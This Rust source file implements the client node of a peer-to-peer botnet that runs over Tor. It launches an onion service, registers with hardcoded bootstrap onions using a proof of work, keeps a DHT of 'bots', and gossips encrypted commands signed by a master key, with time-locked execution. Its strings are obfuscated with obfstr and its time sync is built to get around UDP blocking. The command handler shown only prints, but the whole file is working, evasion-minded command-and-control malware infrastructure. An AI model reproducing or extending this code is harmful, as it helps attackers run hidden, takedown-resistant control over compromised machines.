use std::time::Duration;
use obfstr::obfstr;
use std::sync::Arc;
use tokio::sync::RwLock;
use tokio::time;
use lru::LruCache;
use std::num::NonZeroUsize;
use protocol::{MeshMsg, PeerInfo, GhostPacket, CommandPayload, GossipMsg, Registration};
use crate::common::crypto::load_or_generate_keys;
use crate::utils::paths::get_appdata_dir;
use crate::p2p::transport::ActivePool;
use crate::p2p::dht::RoutingTable;
use arti_client::{TorClient, TorClientConfig};
use tor_rtcompat::PreferredRuntime;
use rand::seq::SliceRandom;
use futures_util::{SinkExt, StreamExt};
use tokio_tungstenite::{accept_async, client_async, tungstenite::Message};

struct MeshState {
    dht: RoutingTable,
    pool: ActivePool,
    seen_messages: LruCache<String, i64>,
    my_onion: String,
}

pub async fn start_client() -> Result<(), Box<dyn std::error::Error>> {
    println!("{}", obfstr!("Starting Tor Mesh Node (Arti Native)..."));
    
    // 1. Identity
    let key_path = get_appdata_dir().join("sys_keys.dat");
    let identity = load_or_generate_keys(key_path);
    let my_pub_hex = identity.pub_hex.clone();
    
    // 2. Bootstrapping Tor
    let config = TorClientConfig::default();
    let tor_client = TorClient::create_bootstrapped(config).await?;
    
    // 3. Launch Hidden Service (REAL)
    println!("{}", obfstr!("Launching Onion Service..."));
    // Create an ephemeral nickname for this session
    let svc_nickname = format!("node-{}", &my_pub_hex[0..8]);
    
    use arti_client::config::onion_service::OnionServiceConfigBuilder;
    let svc_config = OnionServiceConfigBuilder::default()
        .nickname(svc_nickname.parse().unwrap()) 
        .build()?;
    
    // Launch
    let (service_handle, mut stream) = tor_client.launch_onion_service(svc_config)?.expect("Onion launch returned None");
    
    // Get the Real Onion Address
    let my_onion = if let Some(id) = service_handle.onion_address() {
        // Use Debug format as fallback since Display is missing for HsId
        format!("{:?}.onion", id).replace("HsId(", "").replace(")", "")
    } else {
        return Err("Failed to get onion address".into());
    };
    
    println!("{}: {}", obfstr!("Hidden Service Active"), my_onion);

    let state = Arc::new(RwLock::new(MeshState {
        dht: RoutingTable::new(&my_onion),
        pool: ActivePool::new(),
        seen_messages: LruCache::new(NonZeroUsize::new(1000).unwrap()),
        my_onion: my_onion.clone(),
    }));

    // Register...
    use crate::common::constants::BOOTSTRAP_ONIONS;
    println!("{}", obfstr!("Registering with Bootstrap Swarm (Failover Mode)..."));
    
    let mut bootstrap_success = false;
    for onion_addr in BOOTSTRAP_ONIONS.iter() {
        println!("{}: {}", obfstr!("Attempting Bootstrap"), onion_addr);
        if let Ok(_) = register_via_tor(&tor_client, &state, onion_addr, &my_pub_hex, &my_onion, &identity.keypair).await {
            println!("{}: {}", obfstr!("Bootstrap Success via"), onion_addr);
            bootstrap_success = true;
            break;
        } else {
            eprintln!("{}: {}", obfstr!("Bootstrap Failed via"), onion_addr);
        }
    }
    
    if !bootstrap_success {
        eprintln!("{}", obfstr!("CRITICAL: All Bootstrap Nodes Unreachable."));
    }

    let state_clone = state.clone();
    let tor_clone = tor_client.clone();
    
    // Spawn Service Listener (Inbound)
    tokio::spawn(async move {
        println!("{}", obfstr!("Listening for Inbound Gossip..."));
        while let Some(rend_req) = stream.next().await {
            let req: tor_hsservice::RendRequest = rend_req;
            
            // Accept the rendezvous (Session)
            let mut session_stream = match req.accept().await {
                Ok(s) => s,
                Err(e) => {
                     eprintln!("{}: {}", obfstr!("Failed to accept rendezvous"), e);
                     continue;
                }
            };
            
            let state_inner = state_clone.clone();
            let tor_inner = tor_clone.clone();
            
            // Handle Session Streams
            tokio::spawn(async move {
                while let Some(stream_req) = session_stream.next().await {
                     // stream_req is StreamRequest
                     let data_req = stream_req;
                     
                     // Accept the Data Stream using Empty Connected message
                     use tor_cell::relaycell::msg::Connected;
                     
                     let data_stream = match data_req.accept(Connected::new_empty()).await {
                         Ok(s) => s,
                         Err(e) => {
                             eprintln!("{}: {}", obfstr!("Failed to accept data stream"), e);
                             continue;
                         }
                     };
                     
                     let s_inner = state_inner.clone();
                     let t_inner = tor_inner.clone();
                     tokio::spawn(async move {
                         handle_inbound_connection(data_stream, s_inner, t_inner).await;
                     });
                }
            });
        }
    });

    // 6. Maintenance Loop (Self-Lookup & Keep-Alive)
    // "Bot A executes FIND_BOT(Target = My_ID)" periodically
    let state_maint = state.clone();
    let tor_maint = tor_client.clone();
    let me = my_onion.clone();
    
    tokio::spawn(async move {
        loop {
            // Self-Lookup every 60s
            time::sleep(Duration::from_secs(60)).await;
            perform_lookup(&state_maint, &tor_maint, &me).await;
        }
    });

    // Main thread sleep
    loop {
        time::sleep(Duration::from_secs(3600)).await;
    }
}

async fn handle_inbound_connection(
    stream: arti_client::DataStream, 
    state: Arc<RwLock<MeshState>>, 
    tor: TorClient<PreferredRuntime>
) {
    let mut ws_stream = match accept_async(stream).await {
        Ok(ws) => ws,
        Err(_) => return, // Connection handshake failed
    };
    
    // Inbound Connection Handling
    // If a neighbor connects, we process their messages.
    // ActivePool will handle outbound reuse if we reply.
    
    while let Some(msg) = ws_stream.next().await {
        if let Ok(Message::Text(text)) = msg {
            // V10 Protocol: Try to parse generic MeshMsg first
            if let Ok(mesh_msg) = serde_json::from_str::<MeshMsg>(&text) {
                match mesh_msg {
                    MeshMsg::Gossip(gossip) => {
                         handle_gossip(state.clone(), gossip, &tor).await;
                    },
                    MeshMsg::FindBot { target_id } => {
                         // Reply with closest peers
                         let closest = {
                             let guard = state.read().await;
                             guard.dht.get_closest_peers(&target_id, 5) // Return 5 neighbors
                         };
                         let resp = MeshMsg::FoundBot { nodes: closest };
                         let resp_json = serde_json::to_string(&resp).unwrap_or_default();
                         let _ = ws_stream.send(Message::Text(resp_json.into())).await;
                    },
                    MeshMsg::FoundBot { nodes } => {
                        // Add to DHT
                         let mut guard = state.write().await;
                         for node in nodes {
                             guard.dht.insert(node);
                         }
                    },
                    _ => {} // Register/GetPeers handled by Bootstrap not Node
                }
            } 
            // Fallback / Legacy (Direct GossipMsg)
            else if let Ok(gossip) = serde_json::from_str::<GossipMsg>(&text) {
                 handle_gossip(state.clone(), gossip, &tor).await;
            }
        }
    }
}

async fn register_via_tor(
    tor: &TorClient<PreferredRuntime>,
    state: &Arc<RwLock<MeshState>>,
    bootstrap_onion: &str,
    my_pub: &str,
    my_onion: &str,
    signing_key: &ed25519_dalek::SigningKey
) -> Result<(), Box<dyn std::error::Error>> {
    let target_url = format!("ws://{}/register", bootstrap_onion);
    let (host, port) = if let Some(idx) = bootstrap_onion.find(':') {
        (&bootstrap_onion[0..idx], bootstrap_onion[idx+1..].parse::<u16>().unwrap_or(80))
    } else {
        (bootstrap_onion, 80)
    };
    
    let stream = tor.connect((host.to_string(), port)).await?;
    let (mut ws_stream, _) = client_async(target_url, stream).await?;
    
    let sig_data = format!("Register:{}", my_onion);
    use ed25519_dalek::Signer;
    let signature = hex::encode(signing_key.sign(sig_data.as_bytes()).to_bytes());
    
    // Solve PoW
    let pow_nonce = solve_pow(my_pub);
    
    let reg = Registration {
        pub_key: my_pub.to_string(),
        onion_address: my_onion.to_string(),
        signature,
        pow_nonce,
        timestamp: chrono::Utc::now().timestamp(),
    };
    
    let msg = MeshMsg::Register(reg);
    let json = serde_json::to_string(&msg)?;
    ws_stream.send(Message::Text(json.into())).await?;
    
    if let Some(Ok(Message::Text(resp_text))) = ws_stream.next().await {
        if let Ok(MeshMsg::Peers(peers)) = serde_json::from_str::<MeshMsg>(&resp_text) {
            let mut guard = state.write().await;
            for p in peers {
                guard.dht.insert(p);
            }
            println!("{}: {} {}", obfstr!("Bootstrap Success. DHT Initialized with"), guard.dht.all_peers().len(), obfstr!("peers."));
        }
    }
    
    Ok(())
}

async fn handle_gossip(state: Arc<RwLock<MeshState>>, msg: GossipMsg, tor: &TorClient<PreferredRuntime>) {
    // 1. Check Cache
    let mut is_seen = false;
    {
        let mut guard = state.write().await;
        if guard.seen_messages.contains(&msg.id) { is_seen = true; }
        else { guard.seen_messages.put(msg.id.clone(), chrono::Utc::now().timestamp()); }
    }
    if is_seen { return; }

    let swarm_key_hex = env!("SWARM_KEY");
    let swarm_key = hex::decode(swarm_key_hex).unwrap_or(vec![0u8; 32]);
    
    // 2. Decrypt & Exec
    if let Some(cmd) = packet_verify_and_decrypt(&msg.packet, &swarm_key) {
        // Secure Time Check (NTP)
        let now = get_secure_time().await;
        
        // Allow 30s drift
        if cmd.execute_at <= now + 30 {
             process_command(&cmd);
        } else {
             println!("{}: {}", obfstr!("Timelocked"), cmd.execute_at);
             tokio::spawn(async move {
                 let wait_s = if cmd.execute_at > now { (cmd.execute_at - now) as u64 } else { 0 };
                 time::sleep(Duration::from_secs(wait_s)).await;
                 process_command(&cmd);
             });
        }
    } else {
        return; // Invalid
    }

    // 3. Propagation (Gossip + DHT)
    if msg.ttl > 0 {
        let targets = {
            let guard = state.read().await;
            // DHT Logic: Get closest peers to ME? Or random?
            // Gossip usually random or close?
            // "Lan truyền lệnh ... qua các đường ống có sẵn".
            // Report says: Entry Bot uses its 10 neighbors (K-Bucket).
            // We use DHT to select peers.
            // If we gossip to EVERYONE in our bucket?
            guard.dht.all_peers()
        };
        
        // Filtering: 30% or 100% logic
        // Use the select_targets logic but adapted
        let selected = select_gossip_target_list(targets);
        println!("{}: {} {}", obfstr!("Gossip Fanout"), selected.len(), obfstr!("peers"));
        
        let next_msg = GossipMsg { ttl: msg.ttl - 1, ..msg };
        let msg_str = serde_json::to_string(&next_msg).unwrap();
        
        // Use ActivePool (Smart Send)
        let mut guard = state.write().await;
        
        // Anti-Eviction: Protect Neighbors
        // We get ALL peers from DHT as "Neighbors" to protect.
        // Collecting inside the lock is perfectly fine (Vec copy).
        // Since we hold the lock, dht is accessible.
        let neighbors: Vec<String> = guard.dht.all_peers().iter().map(|p| p.onion_address.clone()).collect();
        
        for target_peer in selected {
            // Smart Send with Whitelist
            let _ = guard.pool.send_msg(tor, &target_peer.onion_address, msg_str.clone(), &neighbors).await;
        }
    }
}

async fn perform_lookup(state: &Arc<RwLock<MeshState>>, tor: &TorClient<PreferredRuntime>, target_onion: &str) {
    // "FIND_BOT(Target)" implementation
    // 1. Get alpha=2 closest peers from local DHT
    let closest = {
        let guard = state.read().await;
        guard.dht.get_closest_peers(target_onion, 2)
    };
    // "Bot A executes FIND_BOT(Target = My_ID)"
    // We query alpha=2 closest peers to announce ourselves and maintain the DHT.
    // This traffic keeps the circuits alive and updates neighbor routing tables.
    
    let mut guard = state.write().await;
    let find_msg = MeshMsg::FindBot { target_id: target_onion.to_string() }; // V10: Find Myself
    let msg_str = serde_json::to_string(&find_msg).unwrap(); // Use MeshMsg, not raw text
    
    // Anti-Eviction: Protect Neighbors
    let neighbors: Vec<String> = guard.dht.all_peers().iter().map(|p| p.onion_address.clone()).collect();
    
    for peer in closest {
         let _ = guard.pool.send_msg(tor, &peer.onion_address, msg_str.clone(), &neighbors).await;
    }
}

async fn get_secure_time() -> i64 {
    // 1. Attempt NTP sync (UDP 123)
    let ntp_res = tokio::task::spawn_blocking(|| {
        let socket = std::net::UdpSocket::bind("0.0.0.0:0").ok()?;
        socket.set_read_timeout(Some(Duration::from_secs(3))).ok()?; // Fast fail 3s
        match sntpc::simple_get_time("pool.ntp.org:123", &socket) {
            Ok(t) => {
                let ntp_sec = t.sec();
                let unix_sec = ntp_sec as i64 - 2_208_988_800;
                Some(unix_sec)
            },
            Err(_) => None,
        }
    }).await;
    
    if let Ok(Some(ntp_time)) = ntp_res {
        return ntp_time;
    }
    
    obfstr!("[-] NTP Failed. Attempting HTTP Time Sync...");

    // 2. HTTP Fallback (TCP 80/443) - Bypass UDP blocking
    // Google or Facebook (High availability, trusted Date header)
    let client = reqwest::Client::builder()
        .timeout(Duration::from_secs(5))
        .build()
        .unwrap_or_default();

    let targets = vec!["https://www.google.com", "https://www.facebook.com"];
    
    for target in targets {
         if let Ok(resp) = client.head(target).send().await {
             if let Some(date_header) = resp.headers().get("Date") {
                 if let Ok(date_str) = date_header.to_str() {
                     // RFC 2822 format: "Sun, 06 Nov 1994 08:49:37 GMT"
                     if let Ok(parsed) = chrono::DateTime::parse_from_rfc2822(date_str) {
                         println!("{}: {} ({})", obfstr!("[+] Time Synced via HTTP"), target, obfstr!(""));
                         return parsed.timestamp();
                     }
                 }
             }
         }
    }

    // 3. Last Resort: System Time
    obfstr!("[-] All Sync Methods Failed. Using System Time.");
    chrono::Utc::now().timestamp()
}

fn select_gossip_target_list(peers: Vec<PeerInfo>) -> Vec<PeerInfo> {
    let total = peers.len();
    if total == 0 { return vec![]; }
    
    let target_count = if total < 10 {
        total
    } else {
        (total as f32 * 0.3).ceil() as usize
    };
    
    let mut rng = rand::thread_rng();
    peers.choose_multiple(&mut rng, target_count).cloned().collect()
}

fn packet_verify_and_decrypt(packet: &GhostPacket, key: &[u8]) -> Option<CommandPayload> {
    let payload = packet.decrypt(key)?;
    let master_pub_hex = env!("MASTER_PUB_KEY"); 
    let json = serde_json::to_string(&payload).ok()?;
    if protocol::verify_signature(master_pub_hex, json.as_bytes(), &packet.signature) {
        Some(payload)
    } else {
        None
    }
}

fn process_command(cmd: &CommandPayload) {
    println!("{}: {} [{}]", obfstr!("EXECUTING"), cmd.action, cmd.id);
}

fn solve_pow(pub_key: &str) -> u64 {
    use sha2::{Sha256, Digest};
    let mut nonce: u64 = 0;
    obfstr!("[*] Solving PoW (Constraint: 4 Hex Zeros)...");
    let start = std::time::Instant::now();
    loop {
        let input = format!("{}{}", pub_key, nonce);
        let hash = Sha256::digest(input.as_bytes());
        if hash[0] == 0 && hash[1] == 0 {
            let dur = start.elapsed();
            println!("[+] PoW Solved in {:?}. Nonce: {}", dur, nonce);
            return nonce;
        }
        nonce += 1;
    }
}
